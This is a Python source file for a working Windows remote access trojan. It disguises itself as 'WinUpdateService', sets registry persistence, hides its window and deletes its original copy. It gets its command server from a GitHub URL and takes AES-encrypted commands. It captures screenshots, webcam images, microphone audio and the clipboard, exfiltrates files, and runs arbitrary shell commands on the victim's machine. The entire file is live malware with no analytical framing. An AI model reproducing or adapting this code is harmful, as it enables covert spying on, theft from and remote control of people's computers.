import os, io, time, json, base64, random, socket, platform, requests, subprocess, sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import cv2
import wave
import pyperclip
import psutil
import pyaudio
from PIL import ImageGrab
import winreg
import shutil


HIDDEN_FOLDER = os.path.join(os.environ["APPDATA"], "WinUpdateService")
HIDDEN_EXE = os.path.join(HIDDEN_FOLDER, "service.exe")

GITHUB_URL_SOURCE = "https://raw.githubusercontent.com/gzmox/yerasdus-c5-optuiasfd/refs/heads/main/text.txt"
ENCRYPTION_KEY = base64.urlsafe_b64decode("BZ8ZVr6LlAGw9DHcW0M8B8ZZb9emBVDlYzmvh0tPOVk=")
VICTIM_NAME = os.getenv("USERNAME", "unknown")

def encrypt_data(data: bytes) -> str:
    cipher = AES.new(ENCRYPTION_KEY, AES.MODE_CBC)
    ct = cipher.encrypt(pad(data, AES.block_size))
    return json.dumps({
        "iv": base64.b64encode(cipher.iv).decode(),
        "data": base64.b64encode(ct).decode()
    })

def decrypt_data(payload: str) -> bytes:
    obj = json.loads(payload)
    iv = base64.b64decode(obj["iv"])
    ct = base64.b64decode(obj["data"])
    cipher = AES.new(ENCRYPTION_KEY, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(ct), AES.block_size)

def install_to_hidden():
    if not os.path.exists(HIDDEN_FOLDER):
        os.makedirs(HIDDEN_FOLDER, exist_ok=True)

    if not os.path.exists(HIDDEN_EXE):
        current_exe = sys.executable
        try:
            shutil.copy2(current_exe, HIDDEN_EXE)
            print(f"[+] Copied to hidden folder: {HIDDEN_EXE}")
            add_to_startup(HIDDEN_EXE)
            subprocess.call(["attrib", "+h", HIDDEN_FOLDER])
            if os.path.abspath(current_exe) != os.path.abspath(HIDDEN_EXE):
                subprocess.Popen(f'cmd /c ping 127.0.0.1 -n 2 >nul & del "{current_exe}"', shell=True)
            os.startfile(HIDDEN_EXE)
            sys.exit(0)
        except Exception as e:
            print(f"[!] Installation failed: {e}")

def add_to_startup(exe_path):
    try:
        key = winreg.HKEY_CURRENT_USER
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, reg_path, 0, winreg.KEY_SET_VALUE) as reg:
            winreg.SetValueEx(reg, "WinUpdateService", 0, winreg.REG_SZ, exe_path)
        print("[+] Startup persistence added")
    except Exception as e:
        print(f"[!] Failed to add startup entry: {e}")

def send_output(server_url, data):
    payload = encrypt_data(data)
    requests.post(f"{server_url}/api/upload/{VICTIM_NAME}", json={"payload": payload})

def handle_command(server_url, cmd):
    try:
        if cmd == "__screenshot__":
            img = ImageGrab.grab()
            buf = io.BytesIO()
            img.save(buf, format="PNG")
            send_output(server_url, buf.getvalue())

        elif cmd == "__webcam__":
            cam = cv2.VideoCapture(0)
            if not cam.isOpened():
                send_output(server_url, b"No camera detected")
            else:
                ret, frame = cam.read()
                cam.release()
                if ret:
                    _, img_encoded = cv2.imencode('.png', frame)
                    send_output(server_url, img_encoded.tobytes())
                else:
                    send_output(server_url, b"Failed to capture webcam image")

        elif cmd.startswith("__mic__|"):
            try:
                seconds = int(cmd.split("|")[1])
            except:
                seconds = 5

            audio = pyaudio.PyAudio()
            if audio.get_device_count() == 0:
                send_output(server_url, b"No microphone detected")
            else:
                stream = audio.open(format=pyaudio.paInt16, channels=1, rate=44100,
                                    input=True, frames_per_buffer=1024)
                frames = []
                for _ in range(0, int(44100 / 1024 * seconds)):
                    frames.append(stream.read(1024))
                stream.stop_stream()
                stream.close()
                audio.terminate()

                buf = io.BytesIO()
                wf = wave.open(buf, 'wb')
                wf.setnchannels(1)
                wf.setsampwidth(2)
                wf.setframerate(44100)
                wf.writeframes(b''.join(frames))
                wf.close()
                send_output(server_url, buf.getvalue())

        elif cmd == "__sysinfo__":
            sysinfo = json.dumps({
                "platform": platform.platform(),
                "hostname": socket.gethostname(),
                "user": os.getenv("USERNAME"),
                "ip": socket.gethostbyname(socket.gethostname())
            }, indent=2)
            send_output(server_url, sysinfo.encode())

        elif cmd == "__clipboard__":
            send_output(server_url, pyperclip.paste().encode())

        elif cmd == "__ps__":
            processes = "\n".join([f"{p.info['pid']} - {p.info['name']}" for p in psutil.process_iter(['pid','name'])])
            send_output(server_url, processes.encode())

        elif cmd.startswith("__kill__|"):
            pid = int(cmd.split("|")[1])
            psutil.Process(pid).terminate()
            send_output(server_url, f"Killed process {pid}".encode())

        elif cmd.startswith("__upload__|"):
            _, path = cmd.split("|", 1)
            with open(path, "rb") as f:
                send_output(server_url, f.read())

        elif cmd.startswith("__download__|"):
            try:
                remote_path = cmd.split("|", 1)[1]
                file_data = requests.get(f"{server_url}/api/filedata/{VICTIM_NAME}").content
                with open(remote_path, "wb") as f:
                    f.write(file_data)
                send_output(server_url, f"File downloaded to {remote_path}".encode())
            except Exception as e:
                send_output(server_url, f"Download failed: {e}".encode())

        elif cmd == "__selfdestruct__":
            send_output(server_url, b"Client self-destructing")
            exe_path = sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]
            subprocess.Popen(f'cmd /c ping 127.0.0.1 -n 2 >nul & del "{exe_path}"', shell=True)
            sys.exit(0)

        else:
            out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
            send_output(server_url, out)

    except Exception as e:
        send_output(server_url, str(e).encode())

def register(server_url):
    info = {"os": platform.platform(), "hostname": socket.gethostname()}
    payload = encrypt_data(json.dumps(info).encode())
    requests.post(f"{server_url}/api/register/{VICTIM_NAME}", json={"payload": payload})

def poll_commands():
    server_url = None
    first_run = True
    while True:
        try:
            new_url = requests.get(GITHUB_URL_SOURCE, timeout=5).text.strip()
            if new_url and new_url != server_url:
                server_url = new_url
                register(server_url)

            if server_url:
                cmd_payload = requests.get(f"{server_url}/api/cmd/{VICTIM_NAME}", timeout=5).text
                cmd = decrypt_data(cmd_payload).decode().strip()
                if cmd:
                    handle_command(server_url, cmd)
        except Exception as e:
            print(f"[!] Polling error: {e}")

        time.sleep(random.randint(5, 15) if not first_run else random.randint(3, 15))
        first_run = False

def hide_console():
    try:
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

if __name__ == "__main__":
    hide_console()
    if not os.path.exists(HIDDEN_EXE):
        install_to_hidden()
    print("[+] Client started")
    poll_commands()

